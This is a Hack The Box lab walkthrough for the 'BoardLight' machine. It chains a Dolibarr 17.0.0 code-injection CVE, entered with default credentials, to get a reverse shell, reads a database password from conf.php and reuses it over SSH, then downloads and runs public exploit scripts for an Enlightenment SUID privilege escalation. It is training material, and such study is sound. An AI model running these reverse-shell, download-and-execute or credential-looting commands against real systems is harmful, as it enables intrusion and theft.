🔦 HTB: BoardLight — Full Walkthrough

Machine Name: BoardLight
Difficulty: Easy
Categories: CVE Exploitation, Web App, Local PrivEsc

🧠 Summary

The BoardLight machine follows a simple exploit chain involving two public CVEs and basic enumeration:

    📦 CVE-2023-30253 (Dolibarr PHP Code Injection) for initial access

    🔐 Credentials harvested from conf.php

    ⬆️ CVE-2022-37706 (Enlightenment SUID LPE) for root

Let’s break it down step by step.
🔍 Recon & Enumeration

Started with the usual:

nmap -sC -sV -Pn <target-ip>

Results:

    Port 22: SSH

    Port 80: HTTP

Navigated to http://<ip> → generic page, nothing useful aside from revealing the domain: board.htb.
🔎 Subdomain Discovery

Used ffuf to fuzz for virtual hosts:

ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w subdomains.txt

Found: crm.board.htb
🔐 CRM Login Page (Dolibarr v17.0.0)

The subdomain hosted a Dolibarr ERP login page. The version 17.0.0 was clearly visible.

Googled the version → Vulnerable to CVE-2023-30253.
🎯 Vulnerability: CVE-2023-30253 (RCE in Dolibarr)

Exploit: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

The vulnerability arises from improper input validation, allowing PHP code injection via certain admin functions.
⚔️ Exploiting Dolibarr

Used the PoC script linked above. But it required valid credentials.

Tried admin:admin as default creds — and surprisingly, it worked.

Although the login had limited access, it was enough.

Set up a listener and executed:

python3 exploit.py --url http://crm.board.htb --user admin --pass admin --lhost <attacker-ip> --lport <port>

💥 Reverse shell obtained.
🔎 Post-Exploitation: Config File Loot

The initial shell wasn’t fruitful, so I hunted for Dolibarr config files.

According to Dolibarr docs, DB credentials are stored in:

/var/www/html/conf/conf.php

Found it — and extracted the main DB password.
🧑‍💻 SSH Access as larissa

Tried the recovered password against system users via SSH.

Success with:

ssh larissa@<target-ip>

🏁 Got user.txt.
🔼 Privilege Escalation with linPEAS

Ran linpeas.sh to analyze escalation paths:

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

It flagged a suspicious SUID binary: Enlightenment

🧠 Enlightenment is a lightweight desktop environment.

Found installed version: 0.23.1 — vulnerable to CVE-2022-37706
🧨 CVE-2022-37706: Enlightenment SUID LPE

Exploit: https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

This exploit abuses a path handling flaw in enlightenment_sys due to improper /dev/.. traversal logic.

Steps:

wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh
chmod +x exploit.sh
./exploit.sh

✅ Root shell obtained.
📁 Loot

    user.txt: ✅ (larissa)

    root.txt: ✅ (root via Enlightenment exploit)
